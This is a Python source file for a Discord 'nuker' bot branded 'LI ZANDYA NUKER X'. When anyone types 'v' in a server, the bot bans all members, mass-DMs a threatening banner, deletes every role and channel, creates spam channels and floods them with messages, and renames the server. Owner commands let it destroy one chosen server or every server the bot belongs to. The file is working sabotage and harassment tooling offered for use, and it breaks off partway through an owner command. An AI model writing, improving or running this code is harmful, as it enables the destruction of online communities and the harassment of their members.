#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
╔══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗
║     💀 LI ZANDYA NUKER X - DISCORD SERVER DESTROYER 💀                                                                                   ║
║                    JUST TYPE "v" = INSTANT BAN + DESTRUCTION                                                                            ║
║                    👑 POWERED BY LI ZANDYA MAFIA 👑                                                                                     ║
╚══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝
"""

import discord
from discord.ext import commands
import asyncio
import random
import time
import os
import sys
import threading
from datetime import datetime

TOKEN = None
OWNER_ID = None
NUKE_TRIGGER = "v"

MAX_THREADS = 5000
DM_DELAY = 0.001

DM_MESSAGE = """
╔══════════════════════════════════════════════════════════════════════╗
║                                                                      ║
║     ██╗  ██╗███████╗                                                ║
║     ██║ ██╔╝██╔════╝                                                ║
║     █████╔╝ ███████╗                                                ║
║     ██╔═██╗ ╚════██║                                                ║
║     ██║  ██╗███████║                                                ║
║     ╚═╝  ╚═╝╚══════╝                                                ║
║                                                                      ║
║     💀 YOU HAVE BEEN TERMINATED 💀                                   ║
║     🔥 YOUR SERVER IS NOW DESTROYED 🔥                               ║
║     👑 LI ZANDYA MAFIA CONTROLS EVERYTHING 👑                        ║
║                                                                      ║
╚══════════════════════════════════════════════════════════════════════╝
"""

class UltimateNuker:
    def __init__(self):
        self.total_banned = 0
        self.total_kicked = 0
        self.total_dm_sent = 0
        self.total_channels_deleted = 0
        self.total_roles_deleted = 0
        self.nuked_servers = []
        self.is_nuking = False
        self.start_time = None
        
    async def ban_all_members(self, guild):
        """حظر جميع الأعضاء"""
        members = [m for m in guild.members if not m.bot and m != guild.owner]
        success = 0
        fail = 0
        
        def ban_worker(member):
            nonlocal success, fail
            try:
                future = asyncio.run_coroutine_threadsafe(member.ban(reason="LI ZANDYA MAFIA"), bot.loop)
                future.result(timeout=2)
                success += 1
            except:
                fail += 1
        
        threads = []
        for member in members:
            t = threading.Thread(target=ban_worker, args=(member,))
            t.start()
            threads.append(t)
            time.sleep(0.001)
            
            if len(threads) >= MAX_THREADS:
                for t in threads[:500]:
                    t.join(timeout=0.01)
                threads = []
        
        for t in threads:
            t.join(timeout=0.01)
        
        self.total_banned += success
        return success, fail
    
    async def kick_all_members(self, guild):
        """طرد جميع الأعضاء"""
        members = [m for m in guild.members if not m.bot and m != guild.owner]
        success = 0
        fail = 0
        
        def kick_worker(member):
            nonlocal success, fail
            try:
                future = asyncio.run_coroutine_threadsafe(member.kick(reason="LI ZANDYA MAFIA"), bot.loop)
                future.result(timeout=2)
                success += 1
            except:
                fail += 1
        
        threads = []
        for member in members:
            t = threading.Thread(target=kick_worker, args=(member,))
            t.start()
            threads.append(t)
            time.sleep(0.001)
            
            if len(threads) >= MAX_THREADS:
                for t in threads[:500]:
                    t.join(timeout=0.01)
                threads = []
        
        for t in threads:
            t.join(timeout=0.01)
        
        self.total_kicked += success
        return success, fail
    
    async def mass_dm_everyone(self, guild):
        """إرسال رسائل للجميع"""
        members = [m for m in guild.members if not m.bot]
        success = 0
        fail = 0
        
        def send_worker(member):
            nonlocal success, fail
            try:
                future = asyncio.run_coroutine_threadsafe(member.send(DM_MESSAGE), bot.loop)
                future.result(timeout=1)
                success += 1
            except:
                fail += 1
        
        threads = []
        for member in members:
            t = threading.Thread(target=send_worker, args=(member,))
            t.start()
            threads.append(t)
            time.sleep(DM_DELAY)
            
            if len(threads) >= MAX_THREADS:
                for t in threads[:500]:
                    t.join(timeout=0.01)
                threads = []
        
        for t in threads:
            t.join(timeout=0.01)
        
        self.total_dm_sent += success
        return success, fail
    
    async def delete_all_channels(self, guild):
        count = 0
        for channel in guild.channels:
            try:
                await channel.delete()
                count += 1
            except:
                pass
        self.total_channels_deleted += count
        return count
    
    async def delete_all_roles(self, guild):
        count = 0
        for role in guild.roles:
            if role.name != "@everyone":
                try:
                    await role.delete()
                    count += 1
                except:
                    pass
        self.total_roles_deleted += count
        return count
    
    async def create_spam_channels(self, guild):
        channels = []
        for i in range(100):
            try:
                name = f"destroyed-{random.randint(1,99999)}"
                channel = await guild.create_text_channel(name)
                channels.append(channel)
            except:
                pass
        return channels
    
    async def spam_all_channels(self, guild):
        total = 0
        for channel in guild.channels:
            if isinstance(channel, discord.TextChannel):
                for _ in range(30):
                    try:
                        await channel.send(f"💀 DESTROYED BY LI ZANDYA 💀 | {random.randint(1,999999)}")
                        total += 1
                        await asyncio.sleep(0.01)
                    except:
                        pass
        return total
    
    async def rename_server(self, guild):
        try:
            await guild.edit(name="💀 DESTROYED BY LI ZANDYA 💀")
        except:
            pass
    
    async def change_all_nicknames(self, guild):
        count = 0
        for member in guild.members:
            if not member.bot:
                try:
                    await member.edit(nick="💀 DESTROYED 💀")
                    count += 1
                except:
                    pass
        return count
    
    async def ultimate_nuke(self, guild):
        """نوكر شامل - يحظر الجميع ويدمر كل شيء"""
        if self.is_nuking:
            return None
        
        self.is_nuking = True
        results = {
            'banned': 0,
            'banned_failed': 0,
            'dm_sent': 0,
            'dm_failed': 0,
            'channels_deleted': 0,
            'roles_deleted': 0,
            'spam_channels': 0,
            'spam_messages': 0,
            'nicknames_changed': 0
        }
        
        try:
            print(f"[NUKER] Starting nuke on {guild.name}...")
            
            # 1. حظر جميع الأعضاء
            results['banned'], results['banned_failed'] = await self.ban_all_members(guild)
            print(f"[NUKER] Banned: {results['banned']}")
            
            # 2. إرسال رسائل للجميع
            results['dm_sent'], results['dm_failed'] = await self.mass_dm_everyone(guild)
            print(f"[NUKER] DM sent: {results['dm_sent']}")
            
            # 3. تغيير الأسماء
            results['nicknames_changed'] = await self.change_all_nicknames(guild)
            
            # 4. حذف الرتب
            results['roles_deleted'] = await self.delete_all_roles(guild)
            
            # 5. حذف القنوات
            results['channels_deleted'] = await self.delete_all_channels(guild)
            
            # 6. إنشاء قنوات سبام
            spam_channels = await self.create_spam_channels(guild)
            results['spam_channels'] = len(spam_channels)
            
            # 7. سبام
            results['spam_messages'] = await self.spam_all_channels(guild)
            
            # 8. تغيير اسم السيرفر
            await self.rename_server(guild)
            
            self.nuked_servers.append(guild.name)
            print(f"[NUKER] Nuke completed on {guild.name}!")
        except Exception as e:
            print(f"Error: {e}")
        finally:
            self.is_nuking = False
        
        return results

nuker = UltimateNuker()

# ============================================
# DISCORD BOT
# ============================================

intents = discord.Intents.default()
intents.message_content = True
intents.members = True
intents.guilds = True
intents.guild_messages = True
intents.dm_messages = True

bot = commands.Bot(command_prefix='!', intents=intents, help_command=None)

@bot.event
async def on_ready():
    try:
        await bot.user.edit(username="")
    except:
        pass
    
    await bot.change_presence(activity=discord.Game(name=""))
    
    try:
        await bot.user.edit(bio="")
    except:
        pass
    
    nuker.start_time = time.time()
    
    print(f"""
╔══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗
║                                                                                                                                          ║
║     💀 LI ZANDYA NUKER X - ACTIVATED 💀                                                                                                   ║
║                                                                                                                                          ║
║  🤖 BOT NAME: (BLANK)                                                                                                                   ║
║  📡 SERVERS: {len(bot.guilds)}                                                                                                          ║
║  👥 TOTAL MEMBERS: {sum(g.member_count for g in bot.guilds)}                                                                          ║
║                                                                                                                                          ║
║  ⚡ TRIGGER: Type "v" in ANY server = INSTANT BAN + DESTRUCTION ⚡                                                                        ║
║  💀 FIRST USER = MASTER OWNER 💀                                                                                                         ║
║  🔥 NO RESPONSE - JUST DESTRUCTION 🔥                                                                                                    ║
║                                                                                                                                          ║
╚══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝
    """)
    
    print("\n💀 WAITING FOR 'v'... 💀\n")

@bot.event
async def on_message(message):
    if message.author == bot.user:
        return
    
    global OWNER_ID
    
    if OWNER_ID is None:
        OWNER_ID = message.author.id
        print(f"\n👑 OWNER: {message.author}\n")
        await message.channel.send("```👑 YOU ARE NOW THE MASTER OWNER!\n💀 Type 'v' in any server to destroy it!```")
        return
    
    if message.author.id == OWNER_ID and message.content.startswith('!'):
        await handle_owner_command(message)
        return
    
    if message.content.lower().strip() == NUKE_TRIGGER:
        guild = message.guild
        if guild and not nuker.is_nuking:
            print(f"\n💀💀💀 NUKE in {guild.name} by {message.author} 💀💀💀\n")
            await message.channel.send("```💀 NUKE ACTIVATED! BANNING EVERYONE... 💀```")
            results = await nuker.ultimate_nuke(guild)
            if results:
                await message.channel.send(f"```✅ COMPLETE!\n✅ Banned: {results['banned']} members\n✅ DM Sent: {results['dm_sent']}\n✅ Channels Deleted: {results['channels_deleted']}\n✅ Server Destroyed!```")

async def handle_owner_command(message):
    content = message.content.lower()
    
    if content == '!servers':
        if not bot.guilds:
            await message.channel.send("No servers!")
            return
        server_list = []
        for i, guild in enumerate(bot.guilds, 1):
            server_list.append(f"{i}. {guild.name} | Members: {guild.member_count}")
        chunks = [server_list[i:i+20] for i in range(0, len(server_list), 20)]
        for chunk in chunks:
            await message.channel.send("```yaml\n" + "\n".join(chunk) + "\n```")
    
    elif content.startswith('!nuke-server'):
        try:
            parts = content.split()
            if len(parts) < 2:
                await message.channel.send("Usage: !nuke-server <number>")
                return
            number = int(parts[1])
            if number < 1 or number > len(bot.guilds):
                await message.channel.send(f"Invalid! Choose 1-{len(bot.guilds)}")
                return
            guild = bot.guilds[number - 1]
            await message.channel.send(f"NUKING {guild.name}...")
            results = await nuker.ultimate_nuke(guild)
            if results:
                await message.channel.send(f"✅ DESTROYED! Banned: {results['banned']}")
        except:
            await message.channel.send("Invalid number!")
    
    elif content == '!nuke':
        if message.guild:
            await message.channel.send(f"NUKING {message.guild.name}...")
            results = await nuker.ultimate_nuke(message.guild)
            if results:
                await message.channel.send(f"✅ DESTROYED! Banned: {results['banned']}")
    
    elif content == '!nuke-all':
        await message.channel.send(f"GLOBAL NUKE ON {len(bot.guilds)} SERVERS...")
        total_banned = 0
        for guild in bot.guilds:
            results = await nuker.ultimate_nuke(guild)
            if results:
                total_banned += results['banned']
        await message.channel.send(f"✅ COMPLETE! Total Banned: {total_banned}")
    
    elif content == '!stats':
        elapsed = time.time() - nuker.start_time if nuker.start_time else 0
        hours = int(elapsed // 3600)
        minutes = int((elapsed % 3600) // 60)
        await message.channel.send(f"""
